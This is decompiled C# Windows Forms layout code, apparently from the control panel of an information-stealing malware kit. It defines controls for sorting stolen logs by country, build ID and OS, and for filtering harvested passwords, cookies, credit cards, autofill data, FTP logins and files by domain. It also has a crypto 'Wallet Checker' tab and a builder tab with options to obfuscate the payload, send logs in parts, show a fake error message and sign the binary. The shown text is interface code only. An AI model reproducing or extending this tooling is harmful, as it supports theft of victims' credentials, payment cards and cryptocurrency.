		((AnimaTextBox)this.domainsTb).Numeric = false;
		((AnimaTextBox)this.domainsTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.domainsTb).Size = new System.Drawing.Size(640, 210);
		((System.Windows.Forms.Control)this.domainsTb).TabIndex = 115;
		((AnimaTextBox)this.domainsTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.m_a0).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.m_a0).Location = new System.Drawing.Point(627, 7);
		((System.Windows.Forms.Control)this.m_a0).Name = "domainSorterLbl";
		((System.Windows.Forms.Control)this.m_a0).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.m_a0).Style = (Style)1;
		((MetroSetLabel)this.m_a0).StyleManager = null;
		((System.Windows.Forms.Control)this.m_a0).TabIndex = 114;
		((System.Windows.Forms.Control)this.m_a0).Text = "Waiting";
		((System.Windows.Forms.Label)this.m_a0).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.m_a0).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.m_a0).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.m_a1).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.m_a1).Location = new System.Drawing.Point(507, 7);
		((System.Windows.Forms.Control)this.m_a1).Name = "metroSetLabel3";
		((System.Windows.Forms.Control)this.m_a1).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.m_a1).Style = (Style)1;
		((MetroSetLabel)this.m_a1).StyleManager = null;
		((System.Windows.Forms.Control)this.m_a1).TabIndex = 113;
		((System.Windows.Forms.Control)this.m_a1).Text = "Status of sorter:";
		((System.Windows.Forms.Label)this.m_a1).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.m_a1).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.m_a1).ThemeName = "MetroDark";
		((AnimaTextBox)this.singleOsSortTb).Dark = false;
		((System.Windows.Forms.Control)this.singleOsSortTb).Location = new System.Drawing.Point(135, 182);
		((AnimaTextBox)this.singleOsSortTb).MaxLength = 32767;
		((AnimaTextBox)this.singleOsSortTb).MultiLine = false;
		((System.Windows.Forms.Control)this.singleOsSortTb).Name = "singleOsSortTb";
		((AnimaTextBox)this.singleOsSortTb).Numeric = false;
		((AnimaTextBox)this.singleOsSortTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.singleOsSortTb).Size = new System.Drawing.Size(265, 23);
		((System.Windows.Forms.Control)this.singleOsSortTb).TabIndex = 112;
		((AnimaTextBox)this.singleOsSortTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label17).AutoSize = true;
		((System.Windows.Forms.Control)this.label17).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label17).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label17).Location = new System.Drawing.Point(28, 184);
		((System.Windows.Forms.Control)this.label17).Name = "label17";
		((System.Windows.Forms.Control)this.label17).Size = new System.Drawing.Size(25, 15);
		((System.Windows.Forms.Control)this.label17).TabIndex = 111;
		((System.Windows.Forms.Control)this.label17).Text = "OS:";
		((System.Windows.Forms.Control)this.singleFilesSortCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.singleFilesSortCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.singleFilesSortCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.singleFilesSortCb).Checked = false;
		((MetroSetCheckBox)this.singleFilesSortCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.singleFilesSortCb).CheckState = (CheckState)0;
		((System.Windows.Forms.Control)this.singleFilesSortCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.singleFilesSortCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.singleFilesSortCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.singleFilesSortCb).Location = new System.Drawing.Point(162, 397);
		((System.Windows.Forms.Control)this.singleFilesSortCb).Name = "singleFilesSortCb";
		((MetroSetCheckBox)this.singleFilesSortCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.singleFilesSortCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.singleFilesSortCb).Style = (Style)1;
		((MetroSetCheckBox)this.singleFilesSortCb).StyleManager = null;
		((System.Windows.Forms.Control)this.singleFilesSortCb).TabIndex = 110;
		((MetroSetCheckBox)this.singleFilesSortCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.singleFilesSortCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.label16).AutoSize = true;
		((System.Windows.Forms.Control)this.label16).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label16).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label16).Location = new System.Drawing.Point(28, 397);
		((System.Windows.Forms.Control)this.label16).Name = "label16";
		((System.Windows.Forms.Control)this.label16).Size = new System.Drawing.Size(33, 15);
		((System.Windows.Forms.Control)this.label16).TabIndex = 109;
		((System.Windows.Forms.Control)this.label16).Text = "Files:";
		((System.Windows.Forms.Control)this.singleFtpsSortCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.singleFtpsSortCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.singleFtpsSortCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.singleFtpsSortCb).Checked = false;
		((MetroSetCheckBox)this.singleFtpsSortCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.singleFtpsSortCb).CheckState = (CheckState)0;
		((System.Windows.Forms.Control)this.singleFtpsSortCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.singleFtpsSortCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.singleFtpsSortCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.singleFtpsSortCb).Location = new System.Drawing.Point(381, 374);
		((System.Windows.Forms.Control)this.singleFtpsSortCb).Name = "singleFtpsSortCb";
		((MetroSetCheckBox)this.singleFtpsSortCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.singleFtpsSortCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.singleFtpsSortCb).Style = (Style)1;
		((MetroSetCheckBox)this.singleFtpsSortCb).StyleManager = null;
		((System.Windows.Forms.Control)this.singleFtpsSortCb).TabIndex = 108;
		((MetroSetCheckBox)this.singleFtpsSortCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.singleFtpsSortCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.label15).AutoSize = true;
		((System.Windows.Forms.Control)this.label15).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label15).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label15).Location = new System.Drawing.Point(198, 374);
		((System.Windows.Forms.Control)this.label15).Name = "label15";
		((System.Windows.Forms.Control)this.label15).Size = new System.Drawing.Size(35, 15);
		((System.Windows.Forms.Control)this.label15).TabIndex = 107;
		((System.Windows.Forms.Control)this.label15).Text = "FTPs:";
		((System.Windows.Forms.Control)this.singleAfSortCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.singleAfSortCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.singleAfSortCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.singleAfSortCb).Checked = false;
		((MetroSetCheckBox)this.singleAfSortCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.singleAfSortCb).CheckState = (CheckState)0;
		((System.Windows.Forms.Control)this.singleAfSortCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.singleAfSortCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.singleAfSortCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.singleAfSortCb).Location = new System.Drawing.Point(162, 374);
		((System.Windows.Forms.Control)this.singleAfSortCb).Name = "singleAfSortCb";
		((MetroSetCheckBox)this.singleAfSortCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.singleAfSortCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.singleAfSortCb).Style = (Style)1;
		((MetroSetCheckBox)this.singleAfSortCb).StyleManager = null;
		((System.Windows.Forms.Control)this.singleAfSortCb).TabIndex = 106;
		((MetroSetCheckBox)this.singleAfSortCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.singleAfSortCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.label14).AutoSize = true;
		((System.Windows.Forms.Control)this.label14).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label14).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label14).Location = new System.Drawing.Point(28, 374);
		((System.Windows.Forms.Control)this.label14).Name = "label14";
		((System.Windows.Forms.Control)this.label14).Size = new System.Drawing.Size(54, 15);
		((System.Windows.Forms.Control)this.label14).TabIndex = 105;
		((System.Windows.Forms.Control)this.label14).Text = "Autofills:";
		((System.Windows.Forms.Control)this.singleCCsSortCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.singleCCsSortCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.singleCCsSortCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.singleCCsSortCb).Checked = false;
		((MetroSetCheckBox)this.singleCCsSortCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.singleCCsSortCb).CheckState = (CheckState)0;
		((System.Windows.Forms.Control)this.singleCCsSortCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.singleCCsSortCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.singleCCsSortCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.singleCCsSortCb).Location = new System.Drawing.Point(381, 351);
		((System.Windows.Forms.Control)this.singleCCsSortCb).Name = "singleCCsSortCb";
		((MetroSetCheckBox)this.singleCCsSortCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.singleCCsSortCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.singleCCsSortCb).Style = (Style)1;
		((MetroSetCheckBox)this.singleCCsSortCb).StyleManager = null;
		((System.Windows.Forms.Control)this.singleCCsSortCb).TabIndex = 104;
		((MetroSetCheckBox)this.singleCCsSortCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.singleCCsSortCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.label13).AutoSize = true;
		((System.Windows.Forms.Control)this.label13).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label13).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label13).Location = new System.Drawing.Point(198, 351);
		((System.Windows.Forms.Control)this.label13).Name = "label13";
		((System.Windows.Forms.Control)this.label13).Size = new System.Drawing.Size(73, 15);
		((System.Windows.Forms.Control)this.label13).TabIndex = 76;
		((System.Windows.Forms.Control)this.label13).Text = "Credit cards:";
		((AnimaTextBox)this.singleCountrySortTb).Dark = false;
		((System.Windows.Forms.Control)this.singleCountrySortTb).Location = new System.Drawing.Point(135, 33);
		((AnimaTextBox)this.singleCountrySortTb).MaxLength = 32767;
		((AnimaTextBox)this.singleCountrySortTb).MultiLine = false;
		((System.Windows.Forms.Control)this.singleCountrySortTb).Name = "singleCountrySortTb";
		((AnimaTextBox)this.singleCountrySortTb).Numeric = false;
		((AnimaTextBox)this.singleCountrySortTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.singleCountrySortTb).Size = new System.Drawing.Size(265, 23);
		((System.Windows.Forms.Control)this.singleCountrySortTb).TabIndex = 75;
		((AnimaTextBox)this.singleCountrySortTb).UseSystemPasswordChar = false;
		((MetroSetButton)this.singleSort).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.singleSort).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.singleSort).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.singleSort).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.singleSort).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.singleSort).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.singleSort).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.singleSort).Location = new System.Drawing.Point(31, 525);
		((System.Windows.Forms.Control)this.singleSort).Name = "singleSort";
		((MetroSetButton)this.singleSort).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.singleSort).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.singleSort).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.singleSort).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.singleSort).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.singleSort).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.singleSort).Size = new System.Drawing.Size(147, 23);
		((MetroSetButton)this.singleSort).Style = (Style)0;
		((MetroSetButton)this.singleSort).StyleManager = null;
		((System.Windows.Forms.Control)this.singleSort).TabIndex = 74;
		((System.Windows.Forms.Control)this.singleSort).Text = "Sort";
		((MetroSetButton)this.singleSort).ThemeAuthor = "Narwin";
		((MetroSetButton)this.singleSort).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.singleSort).Click += new System.EventHandler(singleSort_Click);
		((AnimaTextBox)this.singleCookieSortTb).Dark = false;
		((System.Windows.Forms.Control)this.singleCookieSortTb).Location = new System.Drawing.Point(194, 243);
		((AnimaTextBox)this.singleCookieSortTb).MaxLength = 32767;
		((AnimaTextBox)this.singleCookieSortTb).MultiLine = false;
		((System.Windows.Forms.Control)this.singleCookieSortTb).Name = "singleCookieSortTb";
		((AnimaTextBox)this.singleCookieSortTb).Numeric = false;
		((AnimaTextBox)this.singleCookieSortTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.singleCookieSortTb).Size = new System.Drawing.Size(206, 23);
		((System.Windows.Forms.Control)this.singleCookieSortTb).TabIndex = 73;
		((AnimaTextBox)this.singleCookieSortTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label12).AutoSize = true;
		((System.Windows.Forms.Control)this.label12).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label12).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label12).Location = new System.Drawing.Point(28, 246);
		((System.Windows.Forms.Control)this.label12).Name = "label12";
		((System.Windows.Forms.Control)this.label12).Size = new System.Drawing.Size(147, 15);
		((System.Windows.Forms.Control)this.label12).TabIndex = 72;
		((System.Windows.Forms.Control)this.label12).Text = "Cookies Contains Domain:";
		((System.Windows.Forms.Control)this.metroSetDivider12).Location = new System.Drawing.Point(473, -6);
		((System.Windows.Forms.Control)this.metroSetDivider12).Name = "metroSetDivider12";
		((MetroSetDivider)this.metroSetDivider12).Orientation = (DividerStyle)1;
		((System.Windows.Forms.Control)this.metroSetDivider12).Size = new System.Drawing.Size(4, 637);
		((MetroSetDivider)this.metroSetDivider12).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider12).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider12).TabIndex = 71;
		((System.Windows.Forms.Control)this.metroSetDivider12).Text = "metroSetDivider12";
		((MetroSetDivider)this.metroSetDivider12).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider12).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider12).Thickness = 1;
		((AnimaTextBox)this.singlePasswordSortTb).Dark = false;
		((System.Windows.Forms.Control)this.singlePasswordSortTb).Location = new System.Drawing.Point(194, 211);
		((AnimaTextBox)this.singlePasswordSortTb).MaxLength = 32767;
		((AnimaTextBox)this.singlePasswordSortTb).MultiLine = false;
		((System.Windows.Forms.Control)this.singlePasswordSortTb).Name = "singlePasswordSortTb";
		((AnimaTextBox)this.singlePasswordSortTb).Numeric = false;
		((AnimaTextBox)this.singlePasswordSortTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.singlePasswordSortTb).Size = new System.Drawing.Size(206, 23);
		((System.Windows.Forms.Control)this.singlePasswordSortTb).TabIndex = 70;
		((AnimaTextBox)this.singlePasswordSortTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label11).AutoSize = true;
		((System.Windows.Forms.Control)this.label11).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label11).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label11).Location = new System.Drawing.Point(28, 214);
		((System.Windows.Forms.Control)this.label11).Name = "label11";
		((System.Windows.Forms.Control)this.label11).Size = new System.Drawing.Size(160, 15);
		((System.Windows.Forms.Control)this.label11).TabIndex = 69;
		((System.Windows.Forms.Control)this.label11).Text = "Passwords Contains Domain:";
		((AnimaTextBox)this.singleCommentSortTb).Dark = false;
		((System.Windows.Forms.Control)this.singleCommentSortTb).Location = new System.Drawing.Point(135, 89);
		((AnimaTextBox)this.singleCommentSortTb).MaxLength = 32767;
		((AnimaTextBox)this.singleCommentSortTb).MultiLine = false;
		((System.Windows.Forms.Control)this.singleCommentSortTb).Name = "singleCommentSortTb";
		((AnimaTextBox)this.singleCommentSortTb).Numeric = false;
		((AnimaTextBox)this.singleCommentSortTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.singleCommentSortTb).Size = new System.Drawing.Size(265, 23);
		((System.Windows.Forms.Control)this.singleCommentSortTb).TabIndex = 68;
		((AnimaTextBox)this.singleCommentSortTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label10).AutoSize = true;
		((System.Windows.Forms.Control)this.label10).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label10).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label10).Location = new System.Drawing.Point(28, 91);
		((System.Windows.Forms.Control)this.label10).Name = "label10";
		((System.Windows.Forms.Control)this.label10).Size = new System.Drawing.Size(64, 15);
		((System.Windows.Forms.Control)this.label10).TabIndex = 67;
		((System.Windows.Forms.Control)this.label10).Text = "Comment:";
		((AnimaTextBox)this.singleIdSortTb).Dark = false;
		((System.Windows.Forms.Control)this.singleIdSortTb).Location = new System.Drawing.Point(135, 61);
		((AnimaTextBox)this.singleIdSortTb).MaxLength = 32767;
		((AnimaTextBox)this.singleIdSortTb).MultiLine = false;
		((System.Windows.Forms.Control)this.singleIdSortTb).Name = "singleIdSortTb";
		((AnimaTextBox)this.singleIdSortTb).Numeric = false;
		((AnimaTextBox)this.singleIdSortTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.singleIdSortTb).Size = new System.Drawing.Size(265, 23);
		((System.Windows.Forms.Control)this.singleIdSortTb).TabIndex = 65;
		((AnimaTextBox)this.singleIdSortTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label9).AutoSize = true;
		((System.Windows.Forms.Control)this.label9).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label9).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label9).Location = new System.Drawing.Point(28, 62);
		((System.Windows.Forms.Control)this.label9).Name = "label9";
		((System.Windows.Forms.Control)this.label9).Size = new System.Drawing.Size(48, 15);
		((System.Windows.Forms.Control)this.label9).TabIndex = 64;
		((System.Windows.Forms.Control)this.label9).Text = "BuildID:";
		((System.Windows.Forms.Control)this.label8).AutoSize = true;
		((System.Windows.Forms.Control)this.label8).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label8).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label8).Location = new System.Drawing.Point(28, 33);
		((System.Windows.Forms.Control)this.label8).Name = "label8";
		((System.Windows.Forms.Control)this.label8).Size = new System.Drawing.Size(53, 15);
		((System.Windows.Forms.Control)this.label8).TabIndex = 61;
		((System.Windows.Forms.Control)this.label8).Text = "Country:";
		((System.Windows.Forms.Control)this.singleStatusLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.singleStatusLbl).Location = new System.Drawing.Point(136, 3);
		((System.Windows.Forms.Control)this.singleStatusLbl).Name = "singleStatusLbl";
		((System.Windows.Forms.Control)this.singleStatusLbl).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.singleStatusLbl).Style = (Style)1;
		((MetroSetLabel)this.singleStatusLbl).StyleManager = null;
		((System.Windows.Forms.Control)this.singleStatusLbl).TabIndex = 60;
		((System.Windows.Forms.Control)this.singleStatusLbl).Text = "Waiting";
		((System.Windows.Forms.Label)this.singleStatusLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.singleStatusLbl).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.singleStatusLbl).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.metroSetLabel1).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.metroSetLabel1).Location = new System.Drawing.Point(16, 3);
		((System.Windows.Forms.Control)this.metroSetLabel1).Name = "metroSetLabel1";
		((System.Windows.Forms.Control)this.metroSetLabel1).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.metroSetLabel1).Style = (Style)1;
		((MetroSetLabel)this.metroSetLabel1).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetLabel1).TabIndex = 59;
		((System.Windows.Forms.Control)this.metroSetLabel1).Text = "Status of sorter:";
		((System.Windows.Forms.Label)this.metroSetLabel1).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.metroSetLabel1).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.metroSetLabel1).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.dd).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.dd).Controls.Add((System.Windows.Forms.Control)this.openWalletBtn);
		((System.Windows.Forms.Control)this.dd).Controls.Add((System.Windows.Forms.Control)this.walletPath);
		((System.Windows.Forms.Control)this.dd).Controls.Add((System.Windows.Forms.Control)this.label7);
		((System.Windows.Forms.Control)this.dd).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TabPage)this.dd).Location = new System.Drawing.Point(194, 4);
		((System.Windows.Forms.Control)this.dd).Name = "walletTab";
		((System.Windows.Forms.Control)this.dd).Padding = new System.Windows.Forms.Padding(3);
		((System.Windows.Forms.Control)this.dd).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.TabPage)this.dd).TabIndex = 15;
		((System.Windows.Forms.Control)this.dd).Text = "Wallet Checker";
		((MetroSetButton)this.openWalletBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.openWalletBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.openWalletBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.openWalletBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.openWalletBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.openWalletBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.openWalletBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.openWalletBtn).Location = new System.Drawing.Point(766, 288);
		((System.Windows.Forms.Control)this.openWalletBtn).Name = "openWalletBtn";
		((MetroSetButton)this.openWalletBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.openWalletBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.openWalletBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.openWalletBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.openWalletBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.openWalletBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.openWalletBtn).Size = new System.Drawing.Size(65, 23);
		((MetroSetButton)this.openWalletBtn).Style = (Style)0;
		((MetroSetButton)this.openWalletBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.openWalletBtn).TabIndex = 122;
		((System.Windows.Forms.Control)this.openWalletBtn).Text = "Open";
		((MetroSetButton)this.openWalletBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.openWalletBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.openWalletBtn).Click += new System.EventHandler(openWalletBtn_Click);
		((AnimaTextBox)this.walletPath).Dark = false;
		((System.Windows.Forms.Control)this.walletPath).Location = new System.Drawing.Point(322, 288);
		((AnimaTextBox)this.walletPath).MaxLength = 32767;
		((AnimaTextBox)this.walletPath).MultiLine = false;
		((System.Windows.Forms.Control)this.walletPath).Name = "walletPath";
		((AnimaTextBox)this.walletPath).Numeric = false;
		((AnimaTextBox)this.walletPath).ReadOnly = true;
		((System.Windows.Forms.Control)this.walletPath).Size = new System.Drawing.Size(438, 23);
		((System.Windows.Forms.Control)this.walletPath).TabIndex = 121;
		((AnimaTextBox)this.walletPath).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label7).AutoSize = true;
		((System.Windows.Forms.Control)this.label7).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label7).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label7).Location = new System.Drawing.Point(322, 270);
		((System.Windows.Forms.Control)this.label7).Name = "label7";
		((System.Windows.Forms.Control)this.label7).Size = new System.Drawing.Size(62, 15);
		((System.Windows.Forms.Control)this.label7).TabIndex = 120;
		((System.Windows.Forms.Control)this.label7).Text = "Wallet file:";
		((System.Windows.Forms.Control)this.builderTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.obfuscateCheckBox);
		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.label59);
		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.sendLogByPartsCb);
		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.label58);
		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.errorMessageTb);
		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.label46);
		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.proSignButton);
